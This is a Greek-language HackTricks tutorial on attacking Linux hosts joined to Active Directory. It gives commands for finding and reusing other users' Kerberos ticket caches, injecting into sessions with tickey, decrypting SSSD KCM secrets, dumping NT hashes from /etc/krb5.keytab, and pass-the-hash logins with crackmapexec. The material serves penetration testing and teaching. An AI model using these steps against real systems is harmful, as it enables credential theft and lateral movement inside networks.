# Linux Active Directory

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Ένα linux μηχάνημα μπορεί επίσης να βρίσκεται μέσα σε ένα περιβάλλον Active Directory.

Ένα linux μηχάνημα σε ένα AD μπορεί να **αποθηκεύει διάφορα CCACHE εισιτήρια μέσα σε αρχεία. Αυτά τα εισιτήρια μπορούν να χρησιμοποιηθούν και καταχραστεί όπως οποιοδήποτε άλλο εισιτήριο kerberos**. Για να διαβάσετε αυτά τα εισιτήρια, θα πρέπει να είστε ο κάτοχος του εισιτηρίου ως χρήστης ή **root** μέσα στο μηχάνημα.

## Απαρίθμηση

### Απαρίθμηση AD από linux

Εάν έχετε πρόσβαση σε ένα AD σε linux (ή bash σε Windows) μπορείτε να δοκιμάσετε το [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να απαριθμήσετε το AD.

Μπορείτε επίσης να ελέγξετε την ακόλουθη σελίδα για να μάθετε **άλλους τρόπους απαρίθμησης του AD από linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

Το FreeIPA είναι μια ανοιχτού κώδικα **εναλλακτική λύση** για το Microsoft Windows **Active Directory**, κυρίως για περιβάλλοντα **Unix**. Συνδυάζει έναν πλήρη **κατάλογο LDAP** με ένα κέντρο διανομής κλειδιών MIT **Kerberos** για τη διαχείριση παρόμοια με το Active Directory. Χρησιμοποιώντας το Dogtag **Certificate System** για τη διαχείριση πιστοποιητικών CA & RA, υποστηρίζει **πολυπαραγοντική** πιστοποίηση, συμπεριλαμβανομένων των έξυπνων καρτών. Το SSSD είναι ενσωματωμένο για διαδικασίες πιστοποίησης Unix. Μάθετε περισσότερα για αυτό στο:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Παιχνίδι με εισιτήρια

### Pass The Ticket

Σε αυτήν τη σελίδα θα βρείτε διάφορα μέρη όπου μπορείτε **να βρείτε εισιτήρια kerberos μέσα σε ένα linux υπολογιστή**, στην ακόλουθη σελίδα μπορείτε να μάθετε πώς να μετατρέψετε αυτά τα εισιτήρια CCache σε μορφή Kirbi (τη μορφή που χρειάζεστε να χρησιμοποιήσετε στα Windows) και επίσης πώς να πραγματοποιήσετε μια επίθεση PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Επαναχρησιμοποίηση εισιτηρίου CCACHE από το /tmp

Τα αρχεία CCACHE είναι δυαδικές μορφές για **αποθήκευση διαπιστευτηρίων Kerberos** και συνήθως αποθηκεύονται με δικαιώματα 600 στο `/tmp`. Αυτά τα αρχεία μπορούν να αναγνωριστούν από τη μορφή τους με το όνομα, `krb5cc_%{uid}`, που συσχετίζεται με το UID του χρήστη. Για τον έλεγχο του εισιτηρίου πιστοποίησης, η **μεταβλητή περιβάλλοντος `KRB5CCNAME`** πρέπει να οριστεί στη διαδρομή του επιθυμητού αρχείου εισιτηρίου, επιτρέποντας την επαναχρησιμοποίησή του.

Εμφανίστε το τρέχον εισιτήριο που χρησιμοποιείται για την πιστοποίηση με `env | grep KRB5CCNAME`. Η μορφή είναι φορητή και το εισιτήριο μπορεί να **επαναχρησιμοποιηθεί ορίζοντας τη μεταβλητή περιβάλλοντος** με `export KRB5CCNAME=/tmp/ticket.ccache`. Η μορφή ονόματος εισιτηρίου Kerberos είναι `krb5cc_%{uid}`, όπου το uid είναι το UID του χρήστη.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Επαναχρησιμοποίηση εισιτηρίων CCACHE από το keyring

**Τα εισιτήρια Kerberos που αποθηκεύονται στη μνήμη ενός διεργασίας μπορούν να εξαχθούν**, ειδικά όταν η προστασία ptrace της μηχανής είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο εργαλείο για αυτόν τον σκοπό βρίσκεται στο [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή εισιτηρίων εισάγοντας σε συνεδρίες και αποθηκεύοντας τα εισιτήρια στο `/tmp`.

Για να ρυθμίσετε και να χρησιμοποιήσετε αυτό το εργαλείο, ακολουθήστε τα παρακάτω βήματα:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Αυτή η διαδικασία θα προσπαθήσει να εισχωρήσει σε διάφορες συνεδρίες, υποδεικνύοντας επιτυχία με την αποθήκευση εξαχθεισών εισιτηρίων στο `/tmp` με μια συμβολοσειρά ονομασίας `__krb_UID.ccache`.


### Επαναχρησιμοποίηση εισιτηρίου CCACHE από το SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της βάσης δεδομένων στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Ο αντίστοιχος κλειδί αποθηκεύεται ως κρυφό αρχείο στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το κλειδί είναι αναγνώσιμο μόνο αν έχετε δικαιώματα **root**.

Η εκτέλεση της εντολής \*\*`SSSDKCMExtractor` \*\* με τις παραμέτρους --database και --key θα αναλύσει τη βάση δεδομένων και θα **αποκρυπτογραφήσει τα μυστικά**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Το **credential cache Kerberos blob μπορεί να μετατραπεί σε ένα αρχείο Kerberos CCache** που μπορεί να περαστεί στο Mimikatz/Rubeus.

### Επαναχρησιμοποίηση εισιτηρίου CCACHE από keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Εξαγωγή λογαριασμών από το /etc/krb5.keytab

Τα κλειδιά των λογαριασμών υπηρεσίας, τα οποία είναι απαραίτητα για υπηρεσίες που λειτουργούν με δικαιώματα root, αποθηκεύονται με ασφάλεια στα αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, παρόμοια με κωδικούς πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εχεμύθεια.

Για να επιθεωρήσετε το περιεχόμενο του αρχείου keytab, μπορείτε να χρησιμοποιήσετε την εντολή **`klist`**. Το εργαλείο αυτό σχεδιάστηκε για να εμφανίζει λεπτομέρειες των κλειδιών, συμπεριλαμβανομένου του **NT Hash** για την πιστοποίηση του χρήστη, ειδικά όταν ο τύπος του κλειδιού αναγνωρίζεται ως 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Για τους χρήστες Linux, το **`KeyTabExtract`** προσφέρει λειτουργικότητα για την εξαγωγή του κατακερματισμένου RC4 HMAC, το οποίο μπορεί να αξιοποιηθεί για την επαναχρησιμοποίηση του κατακερματισμένου NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Στο macOS, το **`bifrost`** λειτουργεί ως εργαλείο για την ανάλυση αρχείων keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Χρησιμοποιώντας τις εξαγόμενες πληροφορίες λογαριασμού και κατακερματισμένων δεδομένων, μπορούν να δημιουργηθούν συνδέσεις με διακομιστές χρησιμοποιώντας εργαλεία όπως το **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Αναφορές
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
